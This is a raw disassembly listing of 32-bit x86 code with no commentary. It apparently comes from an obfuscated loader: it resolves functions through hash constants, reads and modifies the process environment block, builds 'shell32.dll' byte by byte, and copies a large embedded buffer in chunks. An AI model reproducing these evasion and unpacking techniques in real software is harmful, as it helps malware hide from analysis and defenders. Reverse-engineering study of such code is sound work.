  401eca:	50                   	push   %eax
  401ecb:	e8 80 60 01 00       	call   0x417f50
  401ed0:	83 c4 08             	add    $0x8,%esp
  401ed3:	f2 0f 10 46 38       	movsd  0x38(%esi),%xmm0
  401ed8:	8b 46 40             	mov    0x40(%esi),%eax
  401edb:	c7 86 48 09 00 00 0d 	movl   $0xd,0x948(%esi)
  401ee2:	00 00 00 
  401ee5:	f2 0f 11 86 e0 04 00 	movsd  %xmm0,0x4e0(%esi)
  401eec:	00 
  401eed:	89 86 e8 04 00 00    	mov    %eax,0x4e8(%esi)
  401ef3:	8b 8e e4 04 00 00    	mov    0x4e4(%esi),%ecx
  401ef9:	50                   	push   %eax
  401efa:	51                   	push   %ecx
  401efb:	e8 00 f1 ff ff       	call   0x401000
  401f00:	83 c4 08             	add    $0x8,%esp
  401f03:	8d 8e e0 04 00 00    	lea    0x4e0(%esi),%ecx
  401f09:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  401f10:	00 00 00 
  401f13:	e8 e5 23 00 00       	call   0x4042fd
  401f18:	6a 0c                	push   $0xc
  401f1a:	68 58 da 42 00       	push   $0x42da58
  401f1f:	e8 dc f0 ff ff       	call   0x401000
  401f24:	83 c4 08             	add    $0x8,%esp
  401f27:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
  401f2d:	8b 40 30             	mov    0x30(%eax),%eax
  401f30:	8b 4e 08             	mov    0x8(%esi),%ecx
  401f33:	89 48 08             	mov    %ecx,0x8(%eax)
  401f36:	6a 0d                	push   $0xd
  401f38:	68 64 da 42 00       	push   $0x42da64
  401f3d:	e8 be f0 ff ff       	call   0x401000
  401f42:	83 c4 08             	add    $0x8,%esp
  401f45:	6a 0e                	push   $0xe
  401f47:	68 71 da 42 00       	push   $0x42da71
  401f4c:	e8 af f0 ff ff       	call   0x401000
  401f51:	83 c4 08             	add    $0x8,%esp
  401f54:	6a 0d                	push   $0xd
  401f56:	68 7f da 42 00       	push   $0x42da7f
  401f5b:	e8 a0 f0 ff ff       	call   0x401000
  401f60:	83 c4 08             	add    $0x8,%esp
  401f63:	c7 86 e0 04 00 00 01 	movl   $0x1,0x4e0(%esi)
  401f6a:	00 00 00 
  401f6d:	c7 86 e4 04 00 00 00 	movl   $0x800000,0x4e4(%esi)
  401f74:	00 80 00 
  401f77:	c7 86 e8 04 00 00 00 	movl   $0x80000000,0x4e8(%esi)
  401f7e:	00 00 80 
  401f81:	c6 86 f4 04 00 00 00 	movb   $0x0,0x4f4(%esi)
  401f88:	ff 76 04             	push   0x4(%esi)
  401f8b:	8d 86 e0 04 00 00    	lea    0x4e0(%esi),%eax
  401f91:	50                   	push   %eax
  401f92:	8d 46 38             	lea    0x38(%esi),%eax
  401f95:	50                   	push   %eax
  401f96:	e8 8d 3a 00 00       	call   0x405a28
  401f9b:	83 c4 0c             	add    $0xc,%esp
  401f9e:	83 7e 38 00          	cmpl   $0x0,0x38(%esi)
  401fa2:	0f 84 5b 04 00 00    	je     0x402403
  401fa8:	8b 46 40             	mov    0x40(%esi),%eax
  401fab:	f2 0f 10 46 38       	movsd  0x38(%esi),%xmm0
  401fb0:	c6 46 13 01          	movb   $0x1,0x13(%esi)
  401fb4:	c7 86 48 09 00 00 0f 	movl   $0xf,0x948(%esi)
  401fbb:	00 00 00 
  401fbe:	89 86 e8 00 00 00    	mov    %eax,0xe8(%esi)
  401fc4:	f2 0f 11 86 e0 00 00 	movsd  %xmm0,0xe0(%esi)
  401fcb:	00 
  401fcc:	6a 11                	push   $0x11
  401fce:	68 8c da 42 00       	push   $0x42da8c
  401fd3:	e8 28 f0 ff ff       	call   0x401000
  401fd8:	83 c4 08             	add    $0x8,%esp
  401fdb:	8b 86 e8 00 00 00    	mov    0xe8(%esi),%eax
  401fe1:	f2 0f 10 86 e0 00 00 	movsd  0xe0(%esi),%xmm0
  401fe8:	00 
  401fe9:	c6 46 13 00          	movb   $0x0,0x13(%esi)
  401fed:	89 86 e8 04 00 00    	mov    %eax,0x4e8(%esi)
  401ff3:	8d 86 e0 04 00 00    	lea    0x4e0(%esi),%eax
  401ff9:	f2 0f 11 86 e0 04 00 	movsd  %xmm0,0x4e0(%esi)
  402000:	00 
  402001:	50                   	push   %eax
  402002:	e8 cb 38 00 00       	call   0x4058d2
  402007:	83 c4 04             	add    $0x4,%esp
  40200a:	85 c0                	test   %eax,%eax
  40200c:	74 42                	je     0x402050
  40200e:	89 46 04             	mov    %eax,0x4(%esi)
  402011:	8b 02                	mov    (%edx),%eax
  402013:	89 56 28             	mov    %edx,0x28(%esi)
  402016:	85 c0                	test   %eax,%eax
  402018:	74 12                	je     0x40202c
  40201a:	c7 86 48 09 00 00 10 	movl   $0x10,0x948(%esi)
  402021:	00 00 00 
  402024:	ff 76 04             	push   0x4(%esi)
  402027:	ff d0                	call   *%eax
  402029:	83 c4 04             	add    $0x4,%esp
  40202c:	8b 56 28             	mov    0x28(%esi),%edx
  40202f:	8b 4e 04             	mov    0x4(%esi),%ecx
  402032:	8b 42 04             	mov    0x4(%edx),%eax
  402035:	85 c0                	test   %eax,%eax
  402037:	74 17                	je     0x402050
  402039:	ff 72 08             	push   0x8(%edx)
  40203c:	50                   	push   %eax
  40203d:	51                   	push   %ecx
  40203e:	e8 36 48 00 00       	call   0x406879
  402043:	83 c4 0c             	add    $0xc,%esp
  402046:	c7 86 48 09 00 00 0f 	movl   $0xf,0x948(%esi)
  40204d:	00 00 00 
  402050:	c6 46 13 00          	movb   $0x0,0x13(%esi)
  402054:	c7 86 48 09 00 00 0f 	movl   $0xf,0x948(%esi)
  40205b:	00 00 00 
  40205e:	6a 10                	push   $0x10
  402060:	68 9d da 42 00       	push   $0x42da9d
  402065:	e8 96 ef ff ff       	call   0x401000
  40206a:	83 c4 08             	add    $0x8,%esp
  40206d:	e9 aa 03 00 00       	jmp    0x40241c
  402072:	31 c0                	xor    %eax,%eax
  402074:	89 86 48 09 00 00    	mov    %eax,0x948(%esi)
  40207a:	68 a8 00 00 00       	push   $0xa8
  40207f:	50                   	push   %eax
  402080:	8d 86 e0 04 00 00    	lea    0x4e0(%esi),%eax
  402086:	50                   	push   %eax
  402087:	e8 9f 31 00 00       	call   0x40522b
  40208c:	83 c4 0c             	add    $0xc,%esp
  40208f:	83 be e8 04 00 00 00 	cmpl   $0x0,0x4e8(%esi)
  402096:	0f 84 e1 15 00 00    	je     0x40367d
  40209c:	8d 8e e0 04 00 00    	lea    0x4e0(%esi),%ecx
  4020a2:	e8 56 22 00 00       	call   0x4042fd
  4020a7:	e9 97 03 00 00       	jmp    0x402443
  4020ac:	68 08 02 00 00       	push   $0x208
  4020b1:	31 db                	xor    %ebx,%ebx
  4020b3:	53                   	push   %ebx
  4020b4:	8d 86 e0 04 00 00    	lea    0x4e0(%esi),%eax
  4020ba:	50                   	push   %eax
  4020bb:	e8 40 ac 01 00       	call   0x41cd00
  4020c0:	83 c4 0c             	add    $0xc,%esp
  4020c3:	31 c0                	xor    %eax,%eax
  4020c5:	b9 68 d9 42 00       	mov    $0x42d968,%ecx
  4020ca:	8d 15 70 d9 42 00    	lea    0x42d970,%edx
  4020d0:	89 9e 48 09 00 00    	mov    %ebx,0x948(%esi)
  4020d6:	40                   	inc    %eax
  4020d7:	89 86 e0 00 00 00    	mov    %eax,0xe0(%esi)
  4020dd:	89 8e e4 00 00 00    	mov    %ecx,0xe4(%esi)
  4020e3:	89 96 e8 00 00 00    	mov    %edx,0xe8(%esi)
  4020e9:	89 9e ec 00 00 00    	mov    %ebx,0xec(%esi)
  4020ef:	89 9e f8 00 00 00    	mov    %ebx,0xf8(%esi)
  4020f5:	89 86 04 01 00 00    	mov    %eax,0x104(%esi)
  4020fb:	57                   	push   %edi
  4020fc:	8d 46 38             	lea    0x38(%esi),%eax
  4020ff:	50                   	push   %eax
  402100:	e8 ef 31 00 00       	call   0x4052f4
  402105:	83 c4 08             	add    $0x8,%esp
  402108:	68 04 01 00 00       	push   $0x104
  40210d:	8d 86 e0 04 00 00    	lea    0x4e0(%esi),%eax
  402113:	50                   	push   %eax
  402114:	ff 76 3c             	push   0x3c(%esi)
  402117:	e8 6e 9e 01 00       	call   0x41bf8a
  40211c:	8d 4e 38             	lea    0x38(%esi),%ecx
  40211f:	e8 4d 22 00 00       	call   0x404371
  402124:	e8 5b 9e 01 00       	call   0x41bf84
  402129:	e8 82 c1 00 00       	call   0x40e2b0
  40212e:	6a 1a                	push   $0x1a
  402130:	e8 25 9e 01 00       	call   0x41bf5a
  402135:	6a 0d                	push   $0xd
  402137:	68 70 d9 42 00       	push   $0x42d970
  40213c:	e8 bf ee ff ff       	call   0x401000
  402141:	83 c4 08             	add    $0x8,%esp
  402144:	31 c0                	xor    %eax,%eax
  402146:	40                   	inc    %eax
  402147:	50                   	push   %eax
  402148:	50                   	push   %eax
  402149:	6a 00                	push   $0x0
  40214b:	68 00 d4 36 00       	push   $0x36d400
  402150:	8d 86 e0 00 00 00    	lea    0xe0(%esi),%eax
  402156:	50                   	push   %eax
  402157:	e8 d9 28 00 00       	call   0x404a35
  40215c:	83 c4 14             	add    $0x14,%esp
  40215f:	8b 86 e4 00 00 00    	mov    0xe4(%esi),%eax
  402165:	83 be e0 00 00 00 01 	cmpl   $0x1,0xe0(%esi)
  40216c:	0f 84 4d 14 00 00    	je     0x4035bf
  402172:	8b 8e e8 00 00 00    	mov    0xe8(%esi),%ecx
  402178:	bb e0 00 00 00       	mov    $0xe0,%ebx
  40217d:	89 86 e0 00 00 00    	mov    %eax,0xe0(%esi)
  402183:	89 8e e4 00 00 00    	mov    %ecx,0xe4(%esi)
  402189:	c7 86 e8 00 00 00 00 	movl   $0x0,0xe8(%esi)
  402190:	00 00 00 
  402193:	8d be e0 00 00 00    	lea    0xe0(%esi),%edi
  402199:	81 fb a0 80 4f 00    	cmp    $0x4f80a0,%ebx
  40219f:	0f 83 39 01 00 00    	jae    0x4022de
  4021a5:	8b 8e e8 00 00 00    	mov    0xe8(%esi),%ecx
  4021ab:	81 f9 00 d4 36 00    	cmp    $0x36d400,%ecx
  4021b1:	0f 83 27 01 00 00    	jae    0x4022de
  4021b7:	b8 20 7e 4f 00       	mov    $0x4f7e20,%eax
  4021bc:	ba 20 7e 4f 00       	mov    $0x4f7e20,%edx
  4021c1:	c7 86 48 09 00 00 0b 	movl   $0xb,0x948(%esi)
  4021c8:	00 00 00 
  4021cb:	39 c3                	cmp    %eax,%ebx
  4021cd:	89 d8                	mov    %ebx,%eax
  4021cf:	0f 42 d3             	cmovb  %ebx,%edx
  4021d2:	29 c8                	sub    %ecx,%eax
  4021d4:	81 c2 80 02 00 00    	add    $0x280,%edx
  4021da:	05 00 d4 36 00       	add    $0x36d400,%eax
  4021df:	39 d0                	cmp    %edx,%eax
  4021e1:	0f 43 c2             	cmovae %edx,%eax
  4021e4:	89 c1                	mov    %eax,%ecx
  4021e6:	29 d9                	sub    %ebx,%ecx
  4021e8:	0f 82 b8 13 00 00    	jb     0x4035a6
  4021ee:	8d 83 e8 da 42 00    	lea    0x42dae8(%ebx),%eax
  4021f4:	51                   	push   %ecx
  4021f5:	50                   	push   %eax
  4021f6:	57                   	push   %edi
  4021f7:	89 5e 04             	mov    %ebx,0x4(%esi)
  4021fa:	e8 5e 2f 00 00       	call   0x40515d
  4021ff:	83 c4 0c             	add    $0xc,%esp
  402202:	8b 5e 04             	mov    0x4(%esi),%ebx
  402205:	81 c3 a0 03 00 00    	add    $0x3a0,%ebx
  40220b:	eb 86                	jmp    0x402193
  40220d:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  402214:	00 00 00 
  402217:	6a 10                	push   $0x10
  402219:	68 ab d9 42 00       	push   $0x42d9ab
  40221e:	e8 dd ed ff ff       	call   0x401000
  402223:	83 c4 08             	add    $0x8,%esp
  402226:	8b 46 64             	mov    0x64(%esi),%eax
  402229:	8b 4e 68             	mov    0x68(%esi),%ecx
  40222c:	89 46 34             	mov    %eax,0x34(%esi)
  40222f:	89 4e 18             	mov    %ecx,0x18(%esi)
  402232:	6a 0c                	push   $0xc
  402234:	68 80 d2 42 00       	push   $0x42d280
  402239:	e8 c2 ed ff ff       	call   0x401000
  40223e:	83 c4 08             	add    $0x8,%esp
  402241:	b9 67 4c f9 fb       	mov    $0xfbf94c67,%ecx
  402246:	ba 9d 56 2e eb       	mov    $0xeb2e569d,%edx
  40224b:	e8 bf f0 ff ff       	call   0x40130f
  402250:	89 46 04             	mov    %eax,0x4(%esi)
  402253:	b9 67 4c f9 fb       	mov    $0xfbf94c67,%ecx
  402258:	ba 45 00 0f 42       	mov    $0x420f0045,%edx
  40225d:	e8 ad f0 ff ff       	call   0x40130f
  402262:	89 46 28             	mov    %eax,0x28(%esi)
  402265:	b9 67 4c f9 fb       	mov    $0xfbf94c67,%ecx
  40226a:	ba c7 02 82 7b       	mov    $0x7b8202c7,%edx
  40226f:	e8 9b f0 ff ff       	call   0x40130f
  402274:	89 46 7c             	mov    %eax,0x7c(%esi)
  402277:	b9 67 4c f9 fb       	mov    $0xfbf94c67,%ecx
  40227c:	ba f0 24 a9 fb       	mov    $0xfba924f0,%edx
  402281:	e8 89 f0 ff ff       	call   0x40130f
  402286:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  40228a:	0f 84 5f 01 00 00    	je     0x4023ef
  402290:	83 7e 28 00          	cmpl   $0x0,0x28(%esi)
  402294:	0f 84 d6 01 00 00    	je     0x402470
  40229a:	83 7e 7c 00          	cmpl   $0x0,0x7c(%esi)
  40229e:	0f 84 e4 04 00 00    	je     0x402788
  4022a4:	85 c0                	test   %eax,%eax
  4022a6:	0f 84 ed 04 00 00    	je     0x402799
  4022ac:	6a 0e                	push   $0xe
  4022ae:	68 8c d2 42 00       	push   $0x42d28c
  4022b3:	89 46 78             	mov    %eax,0x78(%esi)
  4022b6:	e8 45 ed ff ff       	call   0x401000
  4022bb:	83 c4 08             	add    $0x8,%esp
  4022be:	8b 7e 18             	mov    0x18(%esi),%edi
  4022c1:	83 ff 40             	cmp    $0x40,%edi
  4022c4:	0f 83 e0 04 00 00    	jae    0x4027aa
  4022ca:	6a 0c                	push   $0xc
  4022cc:	68 0c d9 42 00       	push   $0x42d90c
  4022d1:	e8 2a ed ff ff       	call   0x401000
  4022d6:	83 c4 08             	add    $0x8,%esp
  4022d9:	e9 1b 05 00 00       	jmp    0x4027f9
  4022de:	8b 86 e8 00 00 00    	mov    0xe8(%esi),%eax
  4022e4:	f2 0f 10 86 e0 00 00 	movsd  0xe0(%esi),%xmm0
  4022eb:	00 
  4022ec:	c7 86 48 09 00 00 09 	movl   $0x9,0x948(%esi)
  4022f3:	00 00 00 
  4022f6:	89 46 40             	mov    %eax,0x40(%esi)
  4022f9:	31 c0                	xor    %eax,%eax
  4022fb:	f2 0f 11 46 38       	movsd  %xmm0,0x38(%esi)
  402300:	40                   	inc    %eax
  402301:	50                   	push   %eax
  402302:	50                   	push   %eax
  402303:	6a 00                	push   $0x0
  402305:	68 00 d4 36 00       	push   $0x36d400
  40230a:	57                   	push   %edi
  40230b:	e8 25 27 00 00       	call   0x404a35
  402310:	83 c4 14             	add    $0x14,%esp
  402313:	8b 86 e4 00 00 00    	mov    0xe4(%esi),%eax
  402319:	83 be e0 00 00 00 01 	cmpl   $0x1,0xe0(%esi)
  402320:	0f 84 ad 12 00 00    	je     0x4035d3
  402326:	8b 8e e8 00 00 00    	mov    0xe8(%esi),%ecx
  40232c:	89 86 e0 00 00 00    	mov    %eax,0xe0(%esi)
  402332:	8b 56 40             	mov    0x40(%esi),%edx
  402335:	8d 86 e0 00 00 00    	lea    0xe0(%esi),%eax
  40233b:	c7 86 48 09 00 00 0a 	movl   $0xa,0x948(%esi)
  402342:	00 00 00 
  402345:	89 8e e4 00 00 00    	mov    %ecx,0xe4(%esi)
  40234b:	8b 4e 3c             	mov    0x3c(%esi),%ecx
  40234e:	c7 86 e8 00 00 00 00 	movl   $0x0,0xe8(%esi)
  402355:	00 00 00 
  402358:	50                   	push   %eax
  402359:	e8 b0 ee ff ff       	call   0x40120e
  40235e:	83 c4 04             	add    $0x4,%esp
  402361:	8b 86 e8 00 00 00    	mov    0xe8(%esi),%eax
  402367:	f2 0f 10 86 e0 00 00 	movsd  0xe0(%esi),%xmm0
  40236e:	00 
  40236f:	8d 4e 38             	lea    0x38(%esi),%ecx
  402372:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  402379:	00 00 00 
  40237c:	89 86 88 00 00 00    	mov    %eax,0x88(%esi)
  402382:	f2 0f 11 86 80 00 00 	movsd  %xmm0,0x80(%esi)
  402389:	00 
  40238a:	e8 6e 1f 00 00       	call   0x4042fd
  40238f:	8d 4e 60             	lea    0x60(%esi),%ecx
  402392:	c7 86 48 09 00 00 11 	movl   $0x11,0x948(%esi)
  402399:	00 00 00 
  40239c:	e8 5c 1f 00 00       	call   0x4042fd
  4023a1:	8b 86 88 00 00 00    	mov    0x88(%esi),%eax
  4023a7:	f2 0f 10 86 80 00 00 	movsd  0x80(%esi),%xmm0
  4023ae:	00 
  4023af:	89 46 68             	mov    %eax,0x68(%esi)
  4023b2:	f2 0f 11 46 60       	movsd  %xmm0,0x60(%esi)
  4023b7:	e8 92 9b 01 00       	call   0x41bf4e
  4023bc:	50                   	push   %eax
  4023bd:	e8 98 9b 01 00       	call   0x41bf5a
  4023c2:	83 7e 68 00          	cmpl   $0x0,0x68(%esi)
  4023c6:	0f 84 81 00 00 00    	je     0x40244d
  4023cc:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  4023d3:	00 00 00 
  4023d6:	6a 17                	push   $0x17
  4023d8:	68 7d d9 42 00       	push   $0x42d97d
  4023dd:	e8 1e ec ff ff       	call   0x401000
  4023e2:	b9 6c 42 00 00       	mov    $0x426c,%ecx
  4023e7:	83 c4 08             	add    $0x8,%esp
  4023ea:	e9 0c f7 ff ff       	jmp    0x401afb
  4023ef:	6a 0e                	push   $0xe
  4023f1:	68 44 d9 42 00       	push   $0x42d944
  4023f6:	e8 05 ec ff ff       	call   0x401000
  4023fb:	83 c4 08             	add    $0x8,%esp
  4023fe:	e9 f6 03 00 00       	jmp    0x4027f9
  402403:	c7 86 48 09 00 00 0e 	movl   $0xe,0x948(%esi)
  40240a:	00 00 00 
  40240d:	6a 10                	push   $0x10
  40240f:	68 ad da 42 00       	push   $0x42daad
  402414:	e8 e7 eb ff ff       	call   0x401000
  402419:	83 c4 08             	add    $0x8,%esp
  40241c:	83 7e 38 00          	cmpl   $0x0,0x38(%esi)
  402420:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  402427:	00 00 00 
  40242a:	75 08                	jne    0x402434
  40242c:	8d 4e 38             	lea    0x38(%esi),%ecx
  40242f:	e8 f1 1d 00 00       	call   0x404225
  402434:	6a 0e                	push   $0xe
  402436:	68 bd da 42 00       	push   $0x42dabd
  40243b:	e8 c0 eb ff ff       	call   0x401000
  402440:	83 c4 08             	add    $0x8,%esp
  402443:	b9 b4 42 00 00       	mov    $0x42b4,%ecx
  402448:	e9 ae f6 ff ff       	jmp    0x401afb
  40244d:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  402454:	00 00 00 
  402457:	6a 17                	push   $0x17
  402459:	68 94 d9 42 00       	push   $0x42d994
  40245e:	e8 9d eb ff ff       	call   0x401000
  402463:	b9 b4 42 00 00       	mov    $0x42b4,%ecx
  402468:	83 c4 08             	add    $0x8,%esp
  40246b:	e9 8b f6 ff ff       	jmp    0x401afb
  402470:	6a 0e                	push   $0xe
  402472:	68 36 d9 42 00       	push   $0x42d936
  402477:	e8 84 eb ff ff       	call   0x401000
  40247c:	83 c4 08             	add    $0x8,%esp
  40247f:	e9 75 03 00 00       	jmp    0x4027f9
  402484:	31 c9                	xor    %ecx,%ecx
  402486:	89 8e a8 00 00 00    	mov    %ecx,0xa8(%esi)
  40248c:	89 8e c4 00 00 00    	mov    %ecx,0xc4(%esi)
  402492:	8d 8e c4 00 00 00    	lea    0xc4(%esi),%ecx
  402498:	51                   	push   %ecx
  402499:	6a 04                	push   $0x4
  40249b:	8d 8e a8 00 00 00    	lea    0xa8(%esi),%ecx
  4024a1:	51                   	push   %ecx
  4024a2:	6a 14                	push   $0x14
  4024a4:	50                   	push   %eax
  4024a5:	e8 8c 9a 01 00       	call   0x41bf36
  4024aa:	89 c7                	mov    %eax,%edi
  4024ac:	ff b6 94 00 00 00    	push   0x94(%esi)
  4024b2:	e8 85 9a 01 00       	call   0x41bf3c
  4024b7:	85 ff                	test   %edi,%edi
  4024b9:	74 0d                	je     0x4024c8
  4024bb:	83 be a8 00 00 00 00 	cmpl   $0x0,0xa8(%esi)
  4024c2:	0f 85 57 f8 ff ff    	jne    0x401d1f
  4024c8:	b9 67 4c f9 fb       	mov    $0xfbf94c67,%ecx
  4024cd:	ba e0 3e 9e 01       	mov    $0x19e3ee0,%edx
  4024d2:	e8 38 ee ff ff       	call   0x40130f
  4024d7:	89 46 04             	mov    %eax,0x4(%esi)
  4024da:	b9 67 4c f9 fb       	mov    $0xfbf94c67,%ecx
  4024df:	ba c7 02 82 7b       	mov    $0x7b8202c7,%edx
  4024e4:	e8 26 ee ff ff       	call   0x40130f
  4024e9:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  4024ed:	89 c2                	mov    %eax,%edx
  4024ef:	0f 94 c0             	sete   %al
  4024f2:	85 d2                	test   %edx,%edx
  4024f4:	0f 94 c1             	sete   %cl
  4024f7:	08 c1                	or     %al,%cl
  4024f9:	0f 85 20 f8 ff ff    	jne    0x401d1f
  4024ff:	31 c0                	xor    %eax,%eax
  402501:	40                   	inc    %eax
  402502:	50                   	push   %eax
  402503:	50                   	push   %eax
  402504:	6a 00                	push   $0x0
  402506:	6a 0c                	push   $0xc
  402508:	8d 86 e0 04 00 00    	lea    0x4e0(%esi),%eax
  40250e:	50                   	push   %eax
  40250f:	89 56 28             	mov    %edx,0x28(%esi)
  402512:	e8 1e 25 00 00       	call   0x404a35
  402517:	8b 56 28             	mov    0x28(%esi),%edx
  40251a:	83 c4 14             	add    $0x14,%esp
  40251d:	8b 86 e4 04 00 00    	mov    0x4e4(%esi),%eax
  402523:	83 be e0 04 00 00 01 	cmpl   $0x1,0x4e0(%esi)
  40252a:	0f 84 d7 10 00 00    	je     0x403607
  402530:	8b 8e e8 04 00 00    	mov    0x4e8(%esi),%ecx
  402536:	89 86 d4 00 00 00    	mov    %eax,0xd4(%esi)
  40253c:	89 8e d8 00 00 00    	mov    %ecx,0xd8(%esi)
  402542:	c7 01 73 68 65 6c    	movl   $0x6c656873,(%ecx)
  402548:	c7 41 04 6c 33 32 2e 	movl   $0x2e32336c,0x4(%ecx)
  40254f:	c7 41 08 64 6c 6c 00 	movl   $0x6c6c64,0x8(%ecx)
  402556:	c7 86 dc 00 00 00 0c 	movl   $0xc,0xdc(%esi)
  40255d:	00 00 00 
  402560:	51                   	push   %ecx
  402561:	ff d2                	call   *%edx
  402563:	b9 33 80 0a cb       	mov    $0xcb0a8033,%ecx
  402568:	ba 30 bb ef 08       	mov    $0x8efbb30,%edx
  40256d:	c7 86 48 09 00 00 01 	movl   $0x1,0x948(%esi)
  402574:	00 00 00 
  402577:	e8 93 ed ff ff       	call   0x40130f
  40257c:	85 c0                	test   %eax,%eax
  40257e:	8d be e0 04 00 00    	lea    0x4e0(%esi),%edi
  402584:	0f 84 e4 01 00 00    	je     0x40276e
  40258a:	bb 00 04 00 00       	mov    $0x400,%ebx
  40258f:	89 46 28             	mov    %eax,0x28(%esi)
  402592:	53                   	push   %ebx
  402593:	31 c0                	xor    %eax,%eax
  402595:	50                   	push   %eax
  402596:	57                   	push   %edi
  402597:	e8 64 a7 01 00       	call   0x41cd00
  40259c:	83 c4 0c             	add    $0xc,%esp
  40259f:	53                   	push   %ebx
  4025a0:	57                   	push   %edi
  4025a1:	31 c0                	xor    %eax,%eax
  4025a3:	50                   	push   %eax
  4025a4:	ff 56 04             	call   *0x4(%esi)
  4025a7:	85 c0                	test   %eax,%eax
  4025a9:	0f 84 bf 01 00 00    	je     0x40276e
  4025af:	e8 ed 2b 00 00       	call   0x4051a1
  4025b4:	6a 01                	push   $0x1
  4025b6:	6a 03                	push   $0x3
  4025b8:	e8 af 42 00 00       	call   0x40686c
  4025bd:	83 c4 08             	add    $0x8,%esp
  4025c0:	85 c0                	test   %eax,%eax
  4025c2:	0f 84 53 10 00 00    	je     0x40361b
  4025c8:	ba 03 00 00 00       	mov    $0x3,%edx
  4025cd:	89 c1                	mov    %eax,%ecx
  4025cf:	66 c7 00 5c 5b       	movw   $0x5b5c,(%eax)
  4025d4:	c6 40 02 40          	movb   $0x40,0x2(%eax)
  4025d8:	c7 86 48 09 00 00 07 	movl   $0x7,0x948(%esi)
  4025df:	00 00 00 
  4025e2:	01 d1                	add    %edx,%ecx
  4025e4:	89 96 e0 00 00 00    	mov    %edx,0xe0(%esi)
  4025ea:	89 86 e4 00 00 00    	mov    %eax,0xe4(%esi)
  4025f0:	89 96 e8 00 00 00    	mov    %edx,0xe8(%esi)
  4025f6:	51                   	push   %ecx
  4025f7:	50                   	push   %eax
  4025f8:	8d 86 80 00 00 00    	lea    0x80(%esi),%eax
  4025fe:	50                   	push   %eax
  4025ff:	e8 51 2e 00 00       	call   0x405455
  402604:	83 c4 0c             	add    $0xc,%esp
  402607:	8d 8e e0 00 00 00    	lea    0xe0(%esi),%ecx
  40260d:	c7 86 48 09 00 00 03 	movl   $0x3,0x948(%esi)
  402614:	00 00 00 
  402617:	e8 e1 1c 00 00       	call   0x4042fd
  40261c:	e8 80 2b 00 00       	call   0x4051a1
  402621:	6a 01                	push   $0x1
  402623:	6a 02                	push   $0x2
  402625:	e8 42 42 00 00       	call   0x40686c
  40262a:	83 c4 08             	add    $0x8,%esp
  40262d:	85 c0                	test   %eax,%eax
  40262f:	0f 84 f7 0f 00 00    	je     0x40362c
  402635:	ba 02 00 00 00       	mov    $0x2,%edx
  40263a:	89 c1                	mov    %eax,%ecx
  40263c:	66 c7 00 8b 99       	movw   $0x998b,(%eax)
  402641:	c7 86 48 09 00 00 06 	movl   $0x6,0x948(%esi)
  402648:	00 00 00 
  40264b:	01 d1                	add    %edx,%ecx
  40264d:	89 96 e0 00 00 00    	mov    %edx,0xe0(%esi)
  402653:	89 86 e4 00 00 00    	mov    %eax,0xe4(%esi)
  402659:	89 96 e8 00 00 00    	mov    %edx,0xe8(%esi)
  40265f:	51                   	push   %ecx
  402660:	50                   	push   %eax
  402661:	8d 46 38             	lea    0x38(%esi),%eax
  402664:	50                   	push   %eax
  402665:	e8 a5 2e 00 00       	call   0x40550f
  40266a:	83 c4 0c             	add    $0xc,%esp
  40266d:	8d 8e e0 00 00 00    	lea    0xe0(%esi),%ecx
  402673:	c7 86 48 09 00 00 04 	movl   $0x4,0x948(%esi)
  40267a:	00 00 00 
  40267d:	e8 7b 1c 00 00       	call   0x4042fd
  402682:	31 c0                	xor    %eax,%eax
  402684:	8b 8e 88 00 00 00    	mov    0x88(%esi),%ecx
  40268a:	c7 86 48 09 00 00 05 	movl   $0x5,0x948(%esi)
  402691:	00 00 00 
  402694:	89 86 e0 00 00 00    	mov    %eax,0xe0(%esi)
  40269a:	c7 86 e4 00 00 00 01 	movl   $0x1,0xe4(%esi)
  4026a1:	00 00 00 
  4026a4:	89 86 e8 00 00 00    	mov    %eax,0xe8(%esi)
  4026aa:	8b 86 84 00 00 00    	mov    0x84(%esi),%eax
  4026b0:	51                   	push   %ecx
  4026b1:	50                   	push   %eax
  4026b2:	8d 86 e0 00 00 00    	lea    0xe0(%esi),%eax
  4026b8:	50                   	push   %eax
  4026b9:	e8 9f 2a 00 00       	call   0x40515d
  4026be:	83 c4 0c             	add    $0xc,%esp
  4026c1:	ff 76 40             	push   0x40(%esi)
  4026c4:	ff 76 3c             	push   0x3c(%esi)
  4026c7:	8d 86 e0 00 00 00    	lea    0xe0(%esi),%eax
  4026cd:	50                   	push   %eax
  4026ce:	e8 8a 2a 00 00       	call   0x40515d
  4026d3:	83 c4 0c             	add    $0xc,%esp
  4026d6:	8b 8e e8 00 00 00    	mov    0xe8(%esi),%ecx
  4026dc:	3b 8e e0 00 00 00    	cmp    0xe0(%esi),%ecx
  4026e2:	75 15                	jne    0x4026f9
  4026e4:	8d 86 e0 00 00 00    	lea    0xe0(%esi),%eax
  4026ea:	50                   	push   %eax
  4026eb:	89 4e 04             	mov    %ecx,0x4(%esi)
  4026ee:	e8 2d 93 02 00       	call   0x42ba20
  4026f3:	8b 4e 04             	mov    0x4(%esi),%ecx
  4026f6:	83 c4 04             	add    $0x4,%esp
  4026f9:	8b 86 e4 00 00 00    	mov    0xe4(%esi),%eax
  4026ff:	c6 04 08 00          	movb   $0x0,(%eax,%ecx,1)
  402703:	41                   	inc    %ecx
  402704:	c7 86 48 09 00 00 03 	movl   $0x3,0x948(%esi)
  40270b:	00 00 00 
  40270e:	f2 0f 10 86 e0 00 00 	movsd  0xe0(%esi),%xmm0
  402715:	00 
  402716:	89 8e d0 00 00 00    	mov    %ecx,0xd0(%esi)
  40271c:	8d 4e 38             	lea    0x38(%esi),%ecx
  40271f:	f2 0f 11 86 c8 00 00 	movsd  %xmm0,0xc8(%esi)
  402726:	00 
  402727:	e8 d1 1b 00 00       	call   0x4042fd
  40272c:	8d 8e 80 00 00 00    	lea    0x80(%esi),%ecx
  402732:	c7 86 48 09 00 00 01 	movl   $0x1,0x948(%esi)
  402739:	00 00 00 
  40273c:	e8 bc 1b 00 00       	call   0x4042fd
  402741:	8b 56 28             	mov    0x28(%esi),%edx
  402744:	6a 05                	push   $0x5
  402746:	31 c9                	xor    %ecx,%ecx
  402748:	51                   	push   %ecx
